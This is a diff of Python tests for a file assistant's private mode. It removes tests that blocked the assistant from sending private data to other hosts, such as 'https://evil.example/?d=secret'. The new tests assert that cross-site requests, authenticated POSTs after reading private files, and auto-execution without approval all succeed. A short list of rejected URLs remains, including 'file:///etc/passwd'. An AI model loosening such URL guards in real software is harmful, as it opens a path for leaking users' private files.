@@ -1,9 +1,11 @@
 """文件助手私密对话（docs/assistant-design.md §24）：授权绑定、内存留痕、工具规则、地址规则与跨区移动。"""
 import json
+from unittest.mock import AsyncMock
 
 from tests.test_assistant import AssistantCase, answer, call
 from tests.test_assistant_loop import folder_calls
 from tests.test_assistant_actions import ActionHelpers
+from tests.test_assistant_http import HttpFixture
 from tgdrive.assistant.providers import Reply
 
 PRIVATE = "/api/user/v1/private/assistant"
@@ -211,23 +213,26 @@ class PrivateAssistantTests(ActionHelpers, AssistantCase):
             self.assertNotIn("propose_move_out", self.model.calls[0]["tools"])
         self.run_async(run())
 
-    def test_url_rules_only_allow_links_given_by_user(self):
+    def test_private_requests_can_follow_cross_site_task_links(self):
         async def run():
             admin, _, model = await self.setup_assistant()
             await self.enable_private(admin, model)
             user = await self.unlock(await self.client.login("user", "alice@example.com", "alice password"))
             conversation = await self.private_conversation(user)
-            self.model.replies = [call("http_request", url="https://evil.example/?d=secret"),
-                                  call("browser_open_url", url="https://evil.example/?d=secret"),
+            http = HttpFixture()
+            self.app.offline.http.open = http.open
+            self.model.replies = [call("http_request", url="https://cdn.example/assets?page=2"),
+                                  call("browser_open_url", url="https://cdn.example/assets?page=2"),
                                   call("browser_open_url", url="https://docs.example.com/guide#part"), answer("好")]
             await self.private_send(user, conversation, "打开 https://docs.example.com/guide 看看")
             tools = await self.private_tools(user, conversation)
-            self.assertIn("不是用户在消息里给出的", tools[0]["result"]["error"])
-            self.assertEqual(tools[1]["status"], "error")
+            self.assertEqual(tools[0]["status"], "ok", tools[0]["result"])
+            self.assertEqual(http.requests[0][0].url, "https://cdn.example/assets?page=2")
+            self.assertEqual(tools[1]["status"], "ok")
             self.assertEqual(tools[2]["status"], "ok", tools[2]["result"])
         self.run_async(run())
 
-    def test_url_rules_allow_same_site_links_found_by_web_tools(self):
+    def test_private_url_validation_does_not_require_user_or_same_site_whitelist(self):
         async def run():
             admin, _, model = await self.setup_assistant()
             await self.enable_private(admin, model)
@@ -247,15 +252,45 @@ class PrivateAssistantTests(ActionHelpers, AssistantCase):
             self.assertTrue(allowed("https://www.photos.example.com/albums", "page"))
             self.assertTrue(allowed("https://photos.example.com/album/1", "page"))
             self.assertTrue(allowed("https://www.photos.example.com/album/2?page=3#top", "page"))
-            self.assertFalse(allowed("https://photos.example.com/album/2?page=3&d=secret", "page"), "不能改写查询串")
-            self.assertFalse(allowed("https://evil.example/album/3", "page"), "不能离开用户给出的网站")
-            self.assertFalse(allowed("https://photos.example.com/album/9", "page"), "私密文件里的地址不能由服务端请求")
-            self.assertFalse(allowed("https://photos.example.com/album/8", "page"))
-            self.assertFalse(allowed("https://photos.example.com/album/1", "user"), "user 级仍只认用户消息")
-            # 工具层：http_request 用 page 级，错误文案说明可以用同站链接。
-            self.model.replies = [call("http_request", url="https://evil.example/album/3"), answer("好")]
+            self.assertTrue(allowed("https://photos.example.com/album/2?page=3&sort=time", "page"))
+            self.assertTrue(allowed("https://cdn.example/album/3", "page"))
+            self.assertTrue(allowed("https://photos.example.com/album/9", "page"))
+            self.assertTrue(allowed("https://photos.example.com/album/8", "page"))
+            self.assertTrue(allowed("https://photos.example.com/album/1", "user"))
+            for invalid in ("file:///etc/passwd", "javascript:alert(1)", "https://user:password@example.com/"):
+                self.assertFalse(allowed(invalid, "page"))
+            http = HttpFixture()
+            self.app.offline.http.open = http.open
+            self.model.replies = [call("http_request", url="https://cdn.example/album/3"), answer("好")]
             await self.private_send(user, conversation, "继续")
-            self.assertIn("同站", (await self.private_tools(user, conversation))[-1]["result"]["error"])
+            self.assertEqual((await self.private_tools(user, conversation))[-1]["status"], "ok")
+        self.run_async(run())
+
+    def test_private_full_mode_keeps_auto_execution_after_content_and_http(self):
+        async def run():
+            admin, _, model = await self.setup_assistant()
+            await self.enable_private(admin, model)
+            await self.req("POST", "/api/admin/v1/assistant/settings", {"full_access": True}, admin)
+            await self.put(".tgdrive/private/a.txt", b"task content")
+            user = await self.unlock(await self.client.login("user", "alice@example.com", "alice password"))
+            conversation = await self.private_conversation(user)
+            await self.req("POST", f"{PRIVATE}/conversations/{conversation}/update", {"access_mode": "full"}, user)
+            self.service._client_call = AsyncMock(return_value={"approved": True})
+            http = HttpFixture()
+            self.app.offline.http.open = http.open
+            self.model.replies = [call("read_text_file", path="/a.txt"),
+                call("http_request", url="https://other.example/api", method="POST", json={"page": 2}, auth={"type": "bearer", "token": "third-party"}),
+                call("propose_rename", mapping=[{"from": "/a.txt", "to": "b.txt"}]),
+                call("propose_downloads", urls=["https://cdn.example/file.txt"], target="/"), answer("完成")]
+            await self.private_send(user, conversation, "读文件、查询接口，改名并保存资源")
+            tools = await self.private_tools(user, conversation)
+            self.assertTrue(all(tool["status"] == "ok" for tool in tools), tools)
+            self.assertTrue(tools[1]["result"]["auto"])
+            self.assertIn("自动执行", tools[2]["result"]["status"])
+            self.assertIn("自动执行", tools[3]["result"]["status"])
+            self.assertIn(".tgdrive/private/b.txt", self.keys())
+            self.service._client_call.assert_not_awaited()
+            self.assertEqual(self.app.metadata.db.execute("SELECT COUNT(*) FROM assistant_actions").fetchone()[0], 0)
         self.run_async(run())
 
     def test_private_actions_stay_inside_and_move_out_requires_verification(self):
@@ -281,10 +316,12 @@ class PrivateAssistantTests(ActionHelpers, AssistantCase):
             await self.service._execution_tasks.get(action_id, None) or done
             self.assertIn(".tgdrive/private/归档/a.txt", self.keys())
             self.assertEqual(self.app.metadata.db.execute("SELECT COUNT(*) FROM assistant_actions").fetchone()[0], 0)
-            # 移出：读取内容之后不能提议。
+            # 读取内容后仍可按用户要求提议移出，但不会自动执行。
             self.model.replies = [call("read_text_file", path="/b.txt"), call("propose_move_out", paths=["/b.txt"], target="/"), answer("不行")]
             await self.private_send(user, conversation, "读 b 然后移出")
-            self.assertIn("不能提议移出", (await self.private_tools(user, conversation))[-1]["result"]["error"])
+            tool = (await self.private_tools(user, conversation))[-1]
+            self.assertEqual(tool["status"], "ok", tool["result"])
+            self.assertEqual(self.service.trace.action(self.alice.id, tool["result"]["action_id"])["status"], "pending")
             # 新一轮（新对话）里由用户直接提出：确认时必须重新验证身份。
             conversation = await self.private_conversation(user)
             self.model.replies = [call("propose_move_out", paths=["/b.txt"], target="/导出/"), answer("请确认")]
